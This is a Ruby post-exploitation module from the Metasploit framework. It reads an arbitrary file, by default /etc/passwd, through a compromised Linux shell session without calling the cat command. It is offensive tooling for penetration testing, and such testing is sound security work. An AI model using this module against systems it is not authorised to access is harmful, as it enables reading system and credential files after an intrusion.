##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::Pepa

  def initialize
    super(
      'Name'         => 'PEPA Read File (cat without cat)',
      'Description'  => %q{
        This module will be applied on a session connected to a shell. It will
        extract content from a given file.
      },
      'Author'       => 'Alberto Rafael Rodriguez Iglesias <security[at]vulnerateca.com> <albertocysec[at]gmail.com>',
      'License'      => MSF_LICENSE,
      'Platform'     => ['linux'],
      'SessionTypes' => ['shell']
    )
    register_options(
      [
        OptString.new('FILENAME', [true, 'File path to read, default /etc/passwd','/etc/passwd'])
      ])
  end

  def run
    file = datastore['FILENAME']
    print_status("Doing cat without cat command in FILENAME: #{file}")
    cat_result=pepa_cat(file)
    cat_result.each do |line|
      print_line(line)
    end
  end
end
